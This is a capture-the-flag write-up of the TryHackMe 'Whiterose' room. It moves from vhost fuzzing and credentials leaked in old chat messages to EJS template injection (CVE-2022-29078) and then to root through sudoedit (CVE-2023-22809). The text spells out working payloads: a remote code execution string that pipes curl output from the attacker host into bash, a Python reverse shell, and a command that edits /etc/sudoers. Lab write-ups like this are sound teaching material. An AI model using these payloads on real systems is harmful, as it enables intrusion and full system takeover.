---
title: "TryHackMe: Whiterose"
author: jaxafed
categories: [TryHackMe]
tags: [web, vhost, node, js, ejs, ssti, sudoedit]
render_with_liquid: false
media_subpath: /images/tryhackme_whiterose/
image:
  path: room_image.webp
---

**Whiterose** started with discovering a virtual host and logging in with the credentials provided in the room. After logging in, we accessed a chat and, by modifying a parameter to view old messages, we found a message containing credentials for an admin user. After switching to this admin user, we gained access to a settings page that was vulnerable to **Server-Side Template Injection (SSTI)**, as user-supplied input was directly passed to the `render` function for `ejs`. Exploiting this, we managed to obtain a shell. After acquiring a shell, we used a vulnerability in `sudoedit` to escalate our privileges to the `root` user.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/whiterose){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.116.77
Nmap scan report for 10.10.116.77
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open.

- **22** (`SSH`)  
- **80** (`HTTP`)

### Web 80

Visiting `http://10.10.116.77/` redirects us to `http://cyprusbank.thm/`, so let's add it to our hosts file:

```plaintext
10.10.116.77 cyprusbank.thm
```
{: file="/etc/hosts" }

Afterward, visiting `http://cyprusbank.thm/` displays only a maintenance message.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

### Vhost Enumeration

Since there's nothing interesting and no additional files found through directory fuzzing, let's look for **vhosts** (virtual hosts).

```console
$ ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
...
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 110ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 444ms]
```
{: .wrap }

We find two: `admin` and `www`. Let's add them to our hosts file:

```plaintext
10.10.116.77 cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
```
{: file="/etc/hosts" }

Visiting `http://www.cyprusbank.thm/`, we find it appears identical to `http://cyprusbank.thm/`.

![Web 80 Www Index](web_80_www_index.webp){: width="1200" height="600" }

Visiting `http://admin.cyprusbank.thm/`, we are redirected to `http://admin.cyprusbank.thm/login`, where a login page is displayed.

![Web 80 Admin Index](web_80_admin_index.webp){: width="1200" height="600" }

## Shell as Web

### Access as Gayle Bev

We are unable to access any of the functionality in the top bar. However, the credentials `Olivia Cortez:olivi8` provided in the room work for login.

After logging in with these credentials, we are greeted with a page displaying transactions and accounts. Unfortunately, we cannot view the customers' phone numbers.

![Web 80 Admin Index Two](web_80_admin_index2.webp){: width="1200" height="600" }

While logged in, we also gain access to other pages in the top bar.

Visiting `http://admin.cyprusbank.thm/search` allows us to search for customers by name.

![Web 80 Admin Search](web_80_admin_search.webp){: width="1200" height="600" }

Checking `http://admin.cyprusbank.thm/settings`, we see that we are not authorized to access this page.

![Web 80 Admin Settings](web_80_admin_settings.webp){: width="1200" height="600" }

Finally, checking `Messages` redirects us to `http://admin.cyprusbank.thm/messages/?c=5`, where we can view a chat.

![Web 80 Admin Messages](web_80_admin_messages.webp){: width="1200" height="600" }

While there are no important messages in the chat, the `c` parameter in the URL is interesting. 

When we send a new message in the chat, the oldest message disappears, maintaining a display of five messages.

![Web 80 Admin Messages Two](web_80_admin_messages2.webp){: width="1200" height="600" }

It might be that the `c` parameter is used for the count of messages displayed.

Testing this theory by making a request to `http://admin.cyprusbank.thm/messages/?c=10`, we confirm this is the case, as we can see the old messages, one of which includes the password for the `Gayle Bev` user.

![Web 80 Admin Messages Three](web_80_admin_messages3.webp){: width="1200" height="600" }

### EJS SSTI

After logging out as `Olivia Cortez` and logging in as `Gayle Bev` with the discovered password, we can now see the phone numbers for clients.

![Web 80 Admin Index Three](web_80_admin_index3.webp){: width="1200" height="600" }

We also gain access to the **Settings** page at `http://admin.cyprusbank.thm/settings`.

![Web 80 Admin Settings Two](web_80_admin_settings2.webp){: width="1200" height="600" }

Testing the form, it appears to allow us to change the passwords for customers and displays the new password.

![Web 80 Admin Settings Three](web_80_admin_settings3.webp){: width="1200" height="600" }

Testing the `name` and `password` parameters for vulnerabilities like **SQL** or **SSTI**, we do not find anything. So, let's fuzz for any other parameters the `/settings` endpoint might accept.

Using **ffuf** for this, we discover a couple of interesting parameters:

```console
$ ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AMwjzKA3EcBUXIsqGNDDaHARGh5B7JYwk.jwhk7KbGBNbC46HXtU8Ln%2BqMzdigbh1ZTMDnal6RC24' -mc all -d 'name=test&password=test&FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098
...
include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 123ms]
password                [Status: 200, Size: 2103, Words: 427, Lines: 59, Duration: 473ms]
error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 119ms]
message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 151ms]
client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 157ms]
async                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 159ms]
```
{: .wrap }

While the `error` and `message` parameters simply cause the server to include their values in the response, the `include`, `client`, and `async` parameters are more interesting.

When the `include` and `client` parameters are present, the server returns a **500** response with an error like this:

![Web 80 Admin Settings Four](web_80_admin_settings4.webp){: width="1000" height="500" }

```console
TypeError: /home/web/app/views/settings.ejs:4
    2| <html lang="en">
    3|   <head>
 >> 4|     <%- include("../components/head"); %>
    5|     <title>Cyprus National Bank</title>
    6|   </head>
    7|   <body>

include is not a function
    at eval ("/home/web/app/views/settings.ejs":12:17)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at runMicrotasks (<anonymous>)
```

And when we use the `async` parameter, we simply receive `{}` in the response.

![Web 80 Admin Settings Five](web_80_admin_settings5.webp){: width="1000" height="500" }

From the error, we learn that the application uses **EJS** as a template engine. If the application directly passes our request body to the `render` function as the `data` argument, this could lead to an **SSTI** vulnerability. This is because **EJS** allows certain options, such as `client` and `async`, to be included in the same argument as the data. Notably, the fact that the `client` option causes an error and using the `async` option results in the server responding with only `{}` suggests that this might be the case here.

We can try to confirm this by using the `delimiter` option, which is also one of the options allowed to be passed along with data. By default, it is set to `%`. If we change it to a string that does not exist in the template, we should be able to leak the template.

Testing our theory, we find that we are correct, as we successfully leak the template.

![Web 80 Admin Settings Six](web_80_admin_settings6.webp){: width="1000" height="500" }

As I mentioned before, there are only a limited number of options allowed to be passed along with data. However, this is where the `CVE-2022-29078` vulnerability comes into play. By using the `settings['view options']` parameter, we are able to pass any option without limitation.

And there are certain options, like `outputFunctionName`, that are used by **EJS** without any filtration to build the template body, allowing us to inject code it.

You can find more information about the vulnerability and the **PoC** [here in this article](https://eslam.io/posts/ejs-server-side-template-injection-rce/).

Testing the **PoC** payload from the article, we find that it works, as we receive a request on our server.

```
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22');s
```
{: .wrap }

![Web 80 Admin Settings Seven](web_80_admin_settings7.webp){: width="1000" height="500" }

```console
10.10.116.77 - - [31/Oct/2024 05:03:44] "GET / HTTP/1.1" 200 -
10.10.116.77 - - [31/Oct/2024 05:03:44] "GET / HTTP/1.1" 200 -
10.10.116.77 - - [31/Oct/2024 05:03:45] "GET / HTTP/1.1" 200 -
```

Now, we can use it to obtain a shell, first by using our web server to serve a reverse shell payload.

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'                                     

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{: .wrap }

After that, we can modify our payload to make the server download and run our reverse shell payload.

```console
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22|bash');s
```
{: .wrap }

Sending our payload, we can see that the server hangs, and we receive a shell as the `web` user.

![Web 80 Admin Settings Eight](web_80_admin_settings8.webp){: width="1000" height="500" }

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.116.77] 49286
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
web@cyprusbank:~/app$ export TERM=xterm
export TERM=xterm
web@cyprusbank:~/app$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

web@cyprusbank:~/app$ 
```

After stabilizing our shell, we can read the user flag at `/home/web/user.txt`.

```console
web@cyprusbank:~/app$ wc -c /home/web/user.txt
35 /home/web/user.txt
```

## Shell as root

### CVE-2023-22809

Checking the `sudo` privileges for the `web` user, we can see that the user is able to run `sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm` as the `root` user.

```console
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Checking the version of `sudo`, we see it is `1.9.12p1`.

```console
web@cyprusbank:~/app$ sudoedit --version
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```

Looking for vulnerabilities in the `sudoedit` version `1.9.12p1`, we find the `CVE-2023-22809` vulnerability. You can find detailed information about it in [this security advisory from Synacktiv](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).

Essentially, `sudoedit` allows users to choose their editor using environment variables such as `SUDO_EDITOR`, `VISUAL`, or `EDITOR`. Since the values of these variables can be not only the editor itself but also the arguments to pass to the chosen editor, `sudo` uses `--` while parsing them to separate the editor and its arguments from the files to open for editing.

This means that by using the `--` argument in the editor environment variables, we can force it to open files other than those allowed in the `sudoedit` command we can run. Consequently, since we can execute `sudoedit` as `root` with `sudo`, we can edit any file we want as `root`.

To use this vulnerability for privilege escalation, there are many files we could write to. In this case, we can simply choose to write to the `/etc/sudoers` file to grant ourselves full `sudo` privileges.

We can exploit the vulnerability as follows:


```console
web@cyprusbank:~/app$ export EDITOR="nano -- /etc/sudoers"
web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

As we can see, we were able to open the `/etc/sudoers` file with `nano`.

![Nano Sudoers File](nano_sudoers_file.webp){: width="1000" height="500" }

Now, by making the addition of `web ALL=(ALL) NOPASSWD: ALL` to the file, we can grant our current user full `sudo` privileges.

![Nano Sudoers File Two](nano_sudoers_file2.webp){: width="1000" height="500" }

After saving the file and closing both files, we can see the changes made to our `sudo` privileges.

```console
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    (ALL) NOPASSWD: ALL
```

Finally, by simply running `sudo su -`, we can get a shell as the `root` user and read the root flag at `/root/root.txt`.

```console
web@cyprusbank:~/app$ sudo su -
root@cyprusbank:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cyprusbank:~# wc -c /root/root.txt
21 /root/root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>